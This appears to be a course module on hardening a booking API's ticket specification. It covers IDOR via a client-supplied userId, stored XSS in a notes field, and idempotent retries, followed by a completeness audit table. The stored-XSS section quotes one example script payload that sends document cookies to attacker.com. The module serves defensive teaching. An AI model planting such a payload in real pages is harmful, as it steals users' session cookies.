# Module 05: Task Specification — Fix & Ticket Hardening

## 1. Uncovering the 3 Additional Unstated Assumptions

Beyond the four initial failure modes identified in the BREAK step, rigorous engineering inspection of TICKET-03 revealed three deeper unstated assumptions:

### Assumption 1: User Self-Authorization & Identity Spoofing (IDOR Prevention)
- **The Gap:** The ticket permitted `userId` to be supplied as an arbitrary string in the request body. While acceptable for an anonymous MVP, an executor transitioning to authenticated workflows would naively leave this body parameter in place. This creates an Insecure Direct Object Reference (IDOR) where User A can book sessions under User B's account.
- **The Hardened Specification:**
  - Explicitly document the lifecycle transition: in Slice 1 MVP, `userId` in the body is explicitly marked as a temporary test harness mechanism; in Slice 2, the endpoint MUST enforce `@UseGuards(JwtAuthGuard)` and extract `userId` strictly from `req.user.id`, ignoring any `userId` passed in the body payload.

### Assumption 2: Input Sanitization & Stored XSS in `notes`
- **The Gap:** The ticket restricted `notes` only by length (`max 500 chars`). It did not restrict content. If an attacker submits `<script>fetch('http://attacker.com/steal?cookie=' + document.cookie)</script>`, and the provider's dashboard later renders `booking.notes` without HTML escaping, this results in Stored Cross-Site Scripting (XSS).
- **The Hardened Specification:**
  - Added strict input validation regex `@Matches(/^[^<>]*$/, { message: 'notes cannot contain HTML tags' })` to `CreateBookingDto`.
  - Added an explicit test scenario in Acceptance Criteria verifying that `<script>` tags return `400 Bad Request`.

### Assumption 3: Idempotency & Network Retries
- **The Gap:** Network timeouts on mobile or slow connections cause client HTTP libraries to automatically retry `POST` requests. Without idempotency tracking, the first request creates the booking and locks the slot, while the second retry hits the slot mutex and returns `409 Conflict`. The user sees a failure message ("Slot already booked"), unaware that their original booking succeeded!
- **The Hardened Specification:**
  - Added support for an optional `Idempotency-Key: <uuid>` header.
  - If a request is received with an existing idempotency key within a 5-minute window, the handler returns `200 OK` with the existing booking rather than throwing a false 409 Conflict.

---

## 2. Completeness Audit Checklist Across All 5 Tickets

| Completeness Check | TICKET-01 (Seed) | TICKET-02 (Catalog) | TICKET-03 (Booking) | TICKET-04 (Auth) | TICKET-05 (Dashboard) |
|---|:---:|:---:|:---:|:---:|:---:|
| **Every Status Code Enumerated?** | N/A (CLI) | 200, 500 | 201, 400, 404, 409, 429, 500 | 200, 201, 400, 401, 409 | 200, 401, 500 |
| **Required vs. Optional Fields Declared?** | Yes | N/A (Queryless) | Yes (notes optional) | Yes (all required) | N/A |
| **Exact JSON Response Shapes Provided?** | Yes | Yes (full DTO) | Yes (full DTO) | Yes (user + cookies) | Yes (full DTO) |
| **Auth/Security Stated Explicitly?** | Yes (No auth) | Yes (Public) | Yes (Public MVP -> Guarded) | Yes (bcrypt/JWT) | Yes (JwtAuthGuard) |
| **Unexpected Error Handling Defined?** | Exit code 1 | Global filter | Global filter | Global filter | Global filter |
| **Output Matches Next Ticket Input?** | Seed -> 02/03 | 02 -> 03 | 03 -> 05 | 04 -> 05 | 05 consumes 03/04 |
| **Overall Completeness Score:** | **100%** | **100%** | **100%** | **100%** | **100%** |
